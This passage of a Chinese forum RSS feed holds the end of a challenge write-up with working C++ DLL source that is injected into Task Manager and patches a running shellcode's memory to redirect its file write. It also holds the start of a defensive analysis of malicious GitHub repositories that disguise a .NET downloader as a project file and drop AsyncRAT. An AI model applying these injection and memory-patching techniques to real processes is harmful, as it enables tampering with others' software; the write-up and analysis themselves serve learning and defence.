%p\n"</span>,*((BYTE*)startaddr - <span style="color: rgb(255, 115, 253);">0x5ddb</span> + <span style="color: rgb(255, 115, 253);">4</span>) ,(BYTE*)startaddr - <span style="color: rgb(255, 115, 253);">0x5ddb</span> + <span style="color: rgb(255, 115, 253);">4</span>);<br />                        MessageBoxA(<span style="color: rgb(198, 197, 254);">NULL</span>, msg, <span style="color: rgb(168, 255, 96);">"Success"</span>, MB_OK);<br />                        *((BYTE*)startaddr - <span style="color: rgb(255, 115, 253);">0x5ddb</span> + <span style="color: rgb(255, 115, 253);">4</span>) = <span style="color: rgb(255, 115, 253);">1</span>;<br />                        <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />                    }<br />                    CloseHandle(hThread);<br />                }<br />            }<br />        }<br />    } <span style="color: rgb(150, 203, 254);">while</span>( Thread32Next(hThreadSnap, &amp;te32 ) );<br /><br />    <span style="color: rgb(146, 255, 184);">//  Don't forget to clean up the snapshot object.</span><br />    CloseHandle( hThreadSnap );<br />    <span style="color: rgb(150, 203, 254);">return</span>( FALSE );<br /><br />}<br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>( HMODULE hModule,<br />                       DWORD  ul_reason_for_call,<br />                       LPVOID lpReserved<br />                     )<br />{<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call)<br />    {<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH:<br /><br />        <span style="color: rgb(150, 203, 254);">if</span> (!hack()) {<br />            MessageBoxA(<span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(168, 255, 96);">"Fail"</span>, <span style="color: rgb(168, 255, 96);">"FAIL"</span>, MB_OK);<br />        }<br />        <span style="color: rgb(150, 203, 254);">else</span> {<br />            MessageBoxA(<span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(168, 255, 96);">"Success"</span>, <span style="color: rgb(168, 255, 96);">"Success"</span>, MB_OK);<br />        }<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_ATTACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_DETACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />}<br /></code></pre><p>运行 hack.exe 之后，运行 Xinject.exe 即可达到如下效果：</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=88f42559&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib326QtPE1ZC0kAQImAEn0dTVRCicyfmHVqWnrQAk2qm8HoxKs2M9ibKFGg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>注入结束之后可以看到马上创建了文件。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=626dd702&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3gOqxm4kGlf4gg8JPfxnvFfx5nHaFGiavDtrSqv3cOwRUHrqgjCn2Kpw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>第二题就完整地实现了。</p><p>附件说明：</p><ul><li style="margin-left: 2px;"><p>Xsafe2.sys：加载用于实现 token2 的输出</p></li><li style="margin-left: 2px;"><p>Xinject.exe：用于将下面模块注入 Taskmgr.exe</p></li><li style="margin-left: 2px;"><p>Xhack2.dll（运行时应改名为 XHack.dll）：用于修改代码实现 token1 的输出</p></li></ul><h4>（3）编写程序，运行时修改尽量少的内存，让shellcode 往自行指定的位置写入token1成功。（满分3分）</h4><p>其实还是 hook 这个地方，改它的写入文件名即可，这里我又注意到</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=a0975990&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3kDutJDMUNu6DrFKh8zMssWibed3m7Pcb2icicTc7ZhJI2BLdFhpltvsaQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>往下顺着看，它把RAX写到了 RBP+0x20 的位置，但是最后又对它写了第五个参数，因此基本可以认为这个指令是无用的，尝试去进程分配一块内存，在这个地方将 RCX 的值赋值给它即可达成任意位置的写入。</p><p>这个指令位置在 StartRoutine - 0x5ddb - 0x67 处。</p><p>用下面的代码编译出 <code style="font-family: SFMono-Regular, Consolas, ;">XHack.dll</code> （运行时需要改名为这个，用第二题的注入器，附件中的文件名为 XHack3.dll）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;Windows.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;TlHelp32.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> Dest <span style="color: rgb(168, 255, 96);">"C:\\hijackedByXia0ji233.token1"</span></span><br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">enum</span> <span style="color: rgb(255, 255, 182);">_THREADINFOCLASS</span>{<br />    ThreadBasicInformation,<br />    ThreadTimes,<br />    ThreadPriority,<br />    ThreadBasePriority,<br />    ThreadAffinityMask,<br />    ThreadImpersonationToken,<br />    ThreadDescriptorTableEntry,<br />    ThreadEnableAlignmentFaultFixup,<br />    ThreadEventPair_Reusable,<br />    ThreadQuerySetWin32StartAddress,<br />    ThreadZeroTlsCell,<br />    ThreadPerformanceCount,<br />    ThreadAmILastThread,<br />    ThreadIdealProcessor,<br />    ThreadPriorityBoost,<br />    ThreadSetTlsArrayAddress,<br />    ThreadIsIoPending,<br />    ThreadHideFromDebugger,<br />    ThreadBreakOnTermination,<br />    MaxThreadInfoClass<br />}THREADINFOCLASS;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_CLIENT_ID</span>{<br />    HANDLE UniqueProcess;<br />    HANDLE UniqueThread;<br />}CLIENT_ID;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_THREAD_BASIC_INFORMATION</span>{<br />    LONG ExitStatus;<br />    PVOID TebBaseAddress;<br />    CLIENT_ID ClientId;<br />    LONG AffinityMask;<br />    LONG Priority;<br />    LONG BasePriority;<br />}THREAD_BASIC_INFORMATION,*PTHREAD_BASIC_INFORMATION;<br /><span style="color: rgb(150, 203, 254);">extern</span> <span style="color: rgb(168, 255, 96);">"C"</span> LONG (__stdcall *ZwQueryInformationThread)(<br />    IN HANDLE ThreadHandle,<br />    IN THREADINFOCLASS ThreadInformationClass,<br />    OUT PVOID ThreadInformation,<br />    IN ULONG ThreadInformationLength,<br />    OUT PULONG ReturnLength OPTIONAL<br />    ) = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><br />BYTE CODE[] = {<br />    <span style="color: rgb(255, 115, 253);">0x40</span>,<span style="color: rgb(255, 115, 253);">0x53</span>,<span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0x83</span>,<span style="color: rgb(255, 115, 253);">0xEC</span>,<span style="color: rgb(255, 115, 253);">0x20</span>,<span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0x8B</span>,<span style="color: rgb(255, 115, 253);">0xD9</span>,<span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0x85</span>,<span style="color: rgb(255, 115, 253);">0xC9</span><br />};<br />BYTE HACKCODE[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB9</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span><span style="color: rgb(146, 255, 184);">//mov RCX,xxx</span><br />};<br />BOOL <span style="color: rgb(255, 255, 182);">hack</span>() {<br /><br />    HANDLE hThreadSnap = INVALID_HANDLE_VALUE; <br />    THREADENTRY32 te32; <br />    DWORD dwOwnerPID = GetCurrentProcessId();<br />    hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, <span style="color: rgb(255, 115, 253);">0</span> ); <br />    <span style="color: rgb(150, 203, 254);">if</span>( hThreadSnap == INVALID_HANDLE_VALUE ) <br />    <span style="color: rgb(150, 203, 254);">return</span>( FALSE ); <br /><br />    te32.dwSize = sizeof(THREADENTRY32 ); <br />    <span style="color: rgb(150, 203, 254);">if</span>( !Thread32First( hThreadSnap, &amp;te32 ) ) <br />    {<br />        CloseHandle( hThreadSnap );     <span style="color: rgb(146, 255, 184);">// Must clean up the snapshot object!</span><br />        <span style="color: rgb(150, 203, 254);">return</span>( FALSE );<br />    }<br />    ULONG64 StartAddress;<br />    DWORD dwReturnLength;<br /><br />    <span style="color: rgb(150, 203, 254);">do</span> <br />    { <br />        <span style="color: rgb(150, 203, 254);">if</span>( te32.th32OwnerProcessID == dwOwnerPID )<br />        {<br /><br />            <span style="color: rgb(150, 203, 254);">if</span> (te32.th32OwnerProcessID) {<br />                HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);<br />                <span style="color: rgb(150, 203, 254);">if</span> (hThread != <span style="color: rgb(198, 197, 254);">NULL</span>) {<br /><br />                    HINSTANCE hNTDLL = GetModuleHandle(<span style="color: rgb(168, 255, 96);">L"ntdll"</span>);<br />                    (FARPROC&amp;)ZwQueryInformationThread  = ::GetProcAddress(hNTDLL,<span style="color: rgb(168, 255, 96);">"ZwQueryInformationThread"</span>);<br />                    PVOID startaddr;                                                <span style="color: rgb(146, 255, 184);">// 用来接收线程入口地址</span><br />                                        ZwQueryInformationThread(<br />                                                hThread,                                                        <span style="color: rgb(146, 255, 184);">// 线程句柄</span><br />                                                ThreadQuerySetWin32StartAddress,        <span style="color: rgb(146, 255, 184);">// 线程信息类型，ThreadQuerySetWin32StartAddress ：线程入口地址</span><br />                                                &amp;startaddr,                                                        <span style="color: rgb(146, 255, 184);">// 指向缓冲区的指针</span><br />                                                sizeof(startaddr),                                        <span style="color: rgb(146, 255, 184);">// 缓冲区的大小</span><br />                                                <span style="color: rgb(198, 197, 254);">NULL</span>                                                                <br />                                                );<br /><br />                    <span style="color: rgb(150, 203, 254);">if</span> (!memcmp(startaddr,CODE,sizeof(CODE))) {<br />                        <span style="color: rgb(255, 255, 182);">char</span> msg[<span style="color: rgb(255, 115, 253);">0x50</span>];<br />                        sprintf(msg, <span style="color: rgb(168, 255, 96);">"Found the Shellcode in address:%p"</span>, startaddr);<br />                        MessageBoxA(<span style="color: rgb(198, 197, 254);">NULL</span>, msg, <span style="color: rgb(168, 255, 96);">"Success"</span>, MB_OK);<br />                        sprintf(msg, <span style="color: rgb(168, 255, 96);">"Replace The byte %02x to 0x01 in addr %p\n"</span>,*((BYTE*)startaddr - <span style="color: rgb(255, 115, 253);">0x5ddb</span> + <span style="color: rgb(255, 115, 253);">4</span>) ,(BYTE*)startaddr - <span style="color: rgb(255, 115, 253);">0x5ddb</span> + <span style="color: rgb(255, 115, 253);">4</span>);<br />                        MessageBoxA(<span style="color: rgb(198, 197, 254);">NULL</span>, msg, <span style="color: rgb(168, 255, 96);">"Success"</span>, MB_OK);<br />                        *((BYTE*)startaddr - <span style="color: rgb(255, 115, 253);">0x5ddb</span> + <span style="color: rgb(255, 115, 253);">4</span>) = <span style="color: rgb(255, 115, 253);">1</span>;<br /><br />                        LPVOID buffer=VirtualAlloc(<span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(255, 115, 253);">0x1000</span>, MEM_COMMIT, PAGE_READWRITE);<br />                        memcpy(buffer, Dest, sizeof(Dest));<br />                        *(ULONG64*)(HACKCODE + <span style="color: rgb(255, 115, 253);">2</span>) = (ULONG64)buffer;<br /><br />                        memcpy((BYTE*)startaddr - <span style="color: rgb(255, 115, 253);">0x5ddb</span> - <span style="color: rgb(255, 115, 253);">0x67</span>, HACKCODE, sizeof(HACKCODE));<br /><br />                        MessageBoxA(<span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(168, 255, 96);">"PATH replace to "</span> Dest, <span style="color: rgb(168, 255, 96);">"Success"</span>, MB_OK);<br />                        <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />                    }<br />                    CloseHandle(hThread);<br />                }<br />            }<br />        }<br />    } <span style="color: rgb(150, 203, 254);">while</span>( Thread32Next(hThreadSnap, &amp;te32 ) );<br /><br />    <span style="color: rgb(146, 255, 184);">//  Don't forget to clean up the snapshot object.</span><br />    CloseHandle( hThreadSnap );<br />    <span style="color: rgb(150, 203, 254);">return</span>( FALSE );<br /><br />}<br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>( HMODULE hModule,<br />                       DWORD  ul_reason_for_call,<br />                       LPVOID lpReserved<br />                     )<br />{<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call)<br />    {<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH:<br /><br />        <span style="color: rgb(150, 203, 254);">if</span> (!hack()) {<br />            MessageBoxA(<span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(168, 255, 96);">"Fail"</span>, <span style="color: rgb(168, 255, 96);">"FAIL"</span>, MB_OK);<br />        }<br />        <span style="color: rgb(150, 203, 254);">else</span> {<br />            MessageBoxA(<span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(168, 255, 96);">"Success"</span>, <span style="color: rgb(168, 255, 96);">"Success"</span>, MB_OK);<br />        }<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_ATTACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_DETACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />}<br /></code></pre><p>先分配一个内存，写入地址，再构造 <code style="font-family: SFMono-Regular, Consolas, ;">mov rcx,xxx</code> 指令，最后替换到指定位置即可。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=e86d5fcc&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3023Ds5Nul6n18NfHSuQ85my4PQLOliarHRLcdlZsbZulA5tsbfAB8Bg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>内容也非常完美没有被改变</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=94a11129&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3Sggvib593Pod1pcDavjwCHy6bd34FCKxGTCfEnKNuETZHLnmBWE0mJw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>4，5如上所示，源代码均在本文中提供，在打包的可执行文件中：</p><p>总共的附件说明：</p><ul><li style="margin-left: 2px;"><p>XSafe2.sys：加载后输出token2</p></li><li style="margin-left: 2px;"><p>Xinject.exe：注入任务管理器的注入器（2，3题通用）</p></li><li style="margin-left: 2px;"><p>XHack2.dll：实现第二题的dll（运行时需改名为XHack.dll，且与注入器在同一目录下）</p></li><li style="margin-left: 2px;"><p>XHack3.dll：实现第三题的dll（运行时需改名为XHack.dll，且与注入器在同一目录下）</p></li></ul><h2>花絮</h2><p>三天没打满，中间一天抽空去拿了个ACM省赛。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=8d36b6bc&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3D0VCoxibEMKjkKkaJdLjbKQdWA7RAlNfyQibu0AicKfu4OTibibDOty49Ew%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>然后第二天又接到调剂复试通知赶路去了。</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=f45b3292&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib34akZSiaSaK1DErHkePy9ghZuVOJ69tf00Iy0TKEeVL3dLWRYhvgFTUQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>不过最后好在还是赶着最后完成了赛题 233。</p><h2>参考文献</h2><p>https://www.ctyun.cn/zhishi/p-233867</p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1913623-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Fri, 19 Apr 2024 15:39:22 +0800</pubDate>
</item>
<item>
<title>【PC样本分析】警惕，黑客通过伪装游戏作弊器 dll注入器等的GitHub开源项目传播多种恶意软件</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140493&amp;idx=1&amp;sn=88884999bb2684b0842b1697dd5d3aa7&amp;chksm=bd50a1d98a2728cff316a2794de805646e1c008e5d30a724a878bfe02e2e6083f9f609eafd1b&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140493&amp;idx=1&amp;sn=88884999bb2684b0842b1697dd5d3aa7&amp;chksm=bd50a1d98a2728cff316a2794de805646e1c008e5d30a724a878bfe02e2e6083f9f609eafd1b&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> 1. **GitHub恶意软件警报**：有人在GitHub上下载了一个假装是工程文件的可执行文件，实际上是恶意软件。<br />
2. **GitHub组织信息**：恶意软件仓库隶属于名为Hayrowi的GitHub组织，这个组织下有多个仓库都包含恶意软件。<br />
3. **恶意软件行为分析**：恶意软件的行为分为两层。第一层是一个.NET文件，伪装成sln工程文件，实际上是用来下载恶意软件的。第二层是通过解密压缩包释放的.NET文件，用来执行更进一步的恶意行为。<br />
4. **恶意软件行为链**：经过分析发现，该恶意软件通过两个.NET文件下载最终的恶意载荷，其中包含两个恶意的Electron模块和一个与之相关的注入模块。<br />
5. **具体恶意软件行为**：该恶意软件下载真实的sln白文件，然后下载加密压缩包并解密，释放多个恶意模块，包括异步远程访问工具(AsyncRAT)和RegAsm注入等。<br />
6. **详细样本信息**：提供了恶意软件的具体样本信息和相关哈希值，包括文件名称和SHA256哈希。<br />
7. **相关链接**：提供了官方论坛的链接以及如何设置“星标”获取新消息通知的说明。<br />

这些信息表明，GitHub上存在来自Hayrowi组织的恶意软件，其行为复杂且有组织，需要引起警惕。<br /> <div>
<p>
原创 <span>吾爱pojie</span> <span>2024-04-18 17:51</span> <span style="display: inline-block;">北京</span>
</p>

<p>近期发现有人称在GitHub上下载了一个工程文件打开，不幸中招恶意软件，随即进行了分析。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=bff9b21c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1eJK3Bv1zWbwezicny7CZRInzWCm1vQzn89XYPfdPyicPkaNKUYohl2zg%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：ahov</span></strong></p><br /><p><span></span><br /></p><br /><p>近期发现有人称在GitHub上下载了一个工程文件打开，不幸中招恶意软件，如下图所示：<br /><img border="0" class="rich_pages wxw-img" height="488" src="https://wechat2rss.xlab.app/img-proxy/?k=01d20d6f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl10oB2BJmxOib0gVGP3kYpRHxYDT0QA4Ma4F2nuicwduaFjw4KwDGL687g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="771" /></p><p><br /></p><h2>（一）文件信息</h2><p>下载后可发现，该项目的sln工程文件，实为一个PE可执行文件，如下图所示：<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=6545f184&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1t2bZ0Z5WydzribxP0xzIdQiaXtkfF8icwSq8B6YibmacH10R7icKQMvgJibA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="940" /></p><p><br /></p><p>VirusTotal中的历史文件名称，如下图所示：<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=780644af&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1ItMtXQuia2nsNRbQPic2TGTQzdfuYHqIRWkyTeVoE87ul11odR6Xq42w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="471" /></p><p><br /></p><p>该PE文件使用了无效数字签名，如下图所示：<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=1a427d5b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1JiaKqOIWkWv3oM89wBLfxjrrTxMYDbkQ7k5jrE6lGr6HeLOnwKdnzLw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="470" /></p><p><br /></p><p>该文件使用.NET编写，如下图所示：<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=3a887f7b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1CdQ2K506ibePTtlZJtr8VYKWZ4MczZN6918Zq9y5o22BPNIKTIpicbuA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="722" /></p><p><br /></p><h2>（二）恶意GitHub organization信息</h2><p>该仓库隶属于一个名为Hayrowi的GitHub organization，截至发帖前仍然存在并有效，该organization下部分仓库，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=2307e6aa&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1BVVLRQyNalP0TmcCzNKKGmMDa7ko1xGBDIojNqM4f3fYrkFuBkpcSw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="967" /></p><p><br /></p><p>我们随意点开几个仓库，均发现了相关恶意软件，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=bf30fc3b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1pxP2rhNVs7dpQhbv8ibPUPWru652ADYmvS1SPXOrWSiaRB7bcLDyJCJg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="963" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=e5f6c2c5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1zLNwqBG6cXRnhK1TichURThx9YQicWyWdMxhiawKZJ4aJtyDIsJoglJAg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="960" /><span></span><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=17f29b99&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1B43vS1vtYyxCePB2oqtmokYzZTtg3QibNJCDPjuQDFNpArzRc4W1eow%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: 